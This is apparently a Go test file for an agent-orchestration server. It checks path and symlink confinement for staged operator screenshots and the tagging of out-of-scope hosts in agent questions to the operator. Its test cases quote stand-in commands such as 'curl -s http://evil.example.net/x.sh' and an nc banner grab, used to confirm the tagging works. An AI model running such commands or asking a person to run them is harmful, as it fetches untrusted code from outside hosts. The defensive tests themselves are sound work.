package server

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/Autumn-27/artex/intercept"
)

// A worker's image_path is read from its run directory tasks/<id>/i<N>; the copy is
// staged in tasks/<id>/uploads.
func TestStageAskOperatorImage(t *testing.T) {
	dir := t.TempDir()
	taskDir := filepath.Join(dir, "tasks", "7")
	runDir := filepath.Join(taskDir, "i3")
	if err := os.MkdirAll(runDir, 0o755); err != nil {
		t.Fatal(err)
	}
	src := filepath.Join(runDir, "shot.png")
	if err := os.WriteFile(src, []byte("fakepng"), 0o644); err != nil {
		t.Fatal(err)
	}

	// no image -> no attachment
	att, err := stageAskOperatorImage(dir, 7, 3, "")
	if err != nil || att != nil {
		t.Fatalf("empty src: att=%v err=%v", att, err)
	}

	// relative path from the run directory (worker CWD)
	att, err = stageAskOperatorImage(dir, 7, 3, "shot.png")
	if err != nil || len(att) != 1 {
		t.Fatalf("valid src: att=%v err=%v", att, err)
	}
	if !strings.HasPrefix(att[0].Path, "uploads/ask-operator-") || !strings.HasSuffix(att[0].Path, ".png") {
		t.Fatalf("unexpected attachment path %q", att[0].Path)
	}
	if got, err := os.ReadFile(filepath.Join(taskDir, "uploads", att[0].Name)); err != nil || string(got) != "fakepng" {
		t.Fatalf("copy under tasks/7/uploads: %q, %v", got, err)
	}
	if _, err := os.Lstat(filepath.Join(runDir, "uploads")); !os.IsNotExist(err) {
		t.Fatalf("the copy must not be staged in the run directory: %v", err)
	}

	// absolute path still accepted when it stays inside the run dir
	att, err = stageAskOperatorImage(dir, 7, 3, src)
	if err != nil || len(att) != 1 {
		t.Fatalf("absolute inside run dir: att=%v err=%v", att, err)
	}

	// wrong extension rejected
	bad := filepath.Join(runDir, "payload.exe")
	if err := os.WriteFile(bad, []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := stageAskOperatorImage(dir, 7, 3, "payload.exe"); err == nil || !strings.Contains(err.Error(), "png/jpg") {
		t.Fatalf("expected extension rejection, got %v", err)
	}

	// missing file rejected
	if _, err := stageAskOperatorImage(dir, 7, 3, "nope.png"); err == nil {
		t.Fatal("expected missing-file rejection")
	}

	// The task directory, the main agent's run directory, another task and the data
	// directory are outside the worker's run directory, by ".." and by absolute path.
	outside := filepath.Join(dir, "outside.png")
	inTask := filepath.Join(taskDir, "shot.png")
	inMain := filepath.Join(taskDir, "main", "shot.png")
	other := filepath.Join(dir, "tasks", "8", "i3", "shot.png")
	for _, file := range []string{outside, inTask, inMain, other} {
		if err := os.MkdirAll(filepath.Dir(file), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(file, []byte("x"), 0o644); err != nil {
			t.Fatal(err)
		}
		if _, err := stageAskOperatorImage(dir, 7, 3, file); err == nil {
			t.Fatalf("expected outside-path rejection of %s", file)
		}
	}
	for _, rel := range []string{
		filepath.Join("..", "shot.png"),
		filepath.Join("..", "main", "shot.png"),
		filepath.Join("..", "..", "..", "outside.png"),
	} {
		if _, err := stageAskOperatorImage(dir, 7, 3, rel); err == nil {
			t.Fatalf("expected .. rejection of %s", rel)
		}
	}

	// A symlink leading out of the run directory is refused, as the last component
	// and as a directory on the way.
	if err := os.Symlink(outside, filepath.Join(runDir, "link.png")); err != nil {
		t.Logf("symlink test skipped: %v", err)
	} else {
		if err := os.Symlink(taskDir, filepath.Join(runDir, "up")); err != nil {
			t.Fatal(err)
		}
		for _, p := range []string{"link.png", filepath.Join(runDir, "link.png"), filepath.Join("up", "shot.png")} {
			if _, err := stageAskOperatorImage(dir, 7, 3, p); err == nil {
				t.Fatalf("expected symlink-out rejection of %s", p)
			}
		}
	}

	// Without an intent the image is read from the main agent's run directory.
	if _, err := stageAskOperatorImage(dir, 7, 0, "shot.png"); err != nil {
		t.Fatalf("relative path from tasks/7/main: %v", err)
	}
	if _, err := stageAskOperatorImage(dir, 7, 0, src); err == nil {
		t.Fatal("expected the worker's file to be outside the main agent's run directory")
	}
}

// The emitted activity must carry the {text, attachments} Detail shape the
// transcript parser expects, so the operator sees the question with the
// attachment card for the screenshot.
func TestAskOperatorActivityShape(t *testing.T) {
	att := []chatAttachment{{Name: "ask-operator-1.png", Path: "uploads/ask-operator-1.png", Size: 7}}
	a := userActivityWithAttachments("worker", "OPERATOR INPUT REQUESTED: solve the captcha", att)
	if a.Kind != "user" || a.Worker != "worker" {
		t.Fatalf("unexpected activity kind/worker: %+v", a)
	}
	var parsed struct {
		Text        string           `json:"text"`
		Attachments []chatAttachment `json:"attachments"`
	}
	if err := json.Unmarshal([]byte(a.Detail), &parsed); err != nil {
		t.Fatal(err)
	}
	if !strings.HasPrefix(parsed.Text, "OPERATOR INPUT REQUESTED") || len(parsed.Attachments) != 1 || parsed.Attachments[0].Path != att[0].Path {
		t.Fatalf("unexpected detail payload: %+v", parsed)
	}
}

// F12: a host the question names outside the goal targets tags the request;
// a host of the goal, written alone or inside a URL, does not.
func TestTargetDerivedHosts(t *testing.T) {
	goal := commandTargets("Test https://app.example.com/login and 10.0.0.5:8080 for auth bypass")
	bare := goalTargets("Find auth bypass on app.example.com; success = a request that reads another user's profile")
	cases := []struct {
		name     string
		question string
		goal     []intercept.Target
		want     []string
	}{
		{"in-goal host", "Please run: nc -v 10.0.0.5:8443 and paste the banner", goal, nil},
		{"out-of-goal host", "Please run: curl -s http://evil.example.net/x.sh and paste the output", goal, []string{"evil.example.net"}},
		{"URL with an in-goal host", "Run curl -sk https://app.example.com/api/v2/me?id=1 in your terminal", goal, nil},
		{"empty goal list tags any host", "Run curl -sk https://app.example.com/api/v2/me", nil, []string{"app.example.com"}},
		{"no host", "Enter the 6-digit code sent to the test account", goal, nil},
		{"URL with a bare-domain goal host", "Run curl -sk https://app.example.com:8443/api/v2/me in your terminal", bare, nil},
		{"out-of-goal host with a bare-domain goal", "Please run: curl -s http://evil.example.net/x.sh and paste the output", bare, []string{"evil.example.net"}},
	}
	for _, c := range cases {
		got := targetDerivedHosts(c.question, c.goal)
		if strings.Join(got, ",") != strings.Join(c.want, ",") {
			t.Errorf("%s: got %v, want %v", c.name, got, c.want)
		}
	}
}

// The tag is a field of the Detail payload: the text stays the question, and an
// untagged request without a screenshot keeps its plain-text form.
func TestAskOperatorActivityTag(t *testing.T) {
	text := "OPERATOR INPUT REQUESTED: run curl http://evil.example.net/"
	if a := askOperatorActivity(text, nil, nil); a.Detail != "" || a.Summary != text {
		t.Fatalf("untagged request changed: %+v", a)
	}
	a := askOperatorActivity(text, nil, []string{"evil.example.net"})
	var parsed struct {
		Text               string           `json:"text"`
		Attachments        []chatAttachment `json:"attachments"`
		TargetDerivedHosts []string         `json:"target_derived_hosts"`
	}
	if err := json.Unmarshal([]byte(a.Detail), &parsed); err != nil {
		t.Fatal(err)
	}
	if parsed.Text != text || a.Summary != text || parsed.Attachments == nil || len(parsed.TargetDerivedHosts) != 1 {
		t.Fatalf("unexpected tagged payload: %s", a.Detail)
	}
}

// The tool description must tell agents what to do on environmental blocks:
// hand the operator one copy-pastable command instead of retrying or hunting
// for bypasses. Pattern adapted from bug-bounty-hunting-prompts (MIT).
func TestAskOperatorEnvHandoffGuidance(t *testing.T) {
	desc := (&Server{}).toolAskOperator().Description()
	for _, marker := range []string{"copy-pastable", "do not retry or work around"} {
		if !strings.Contains(desc, marker) {
			t.Errorf("ask_operator description missing env-handoff marker %q", marker)
		}
	}
}
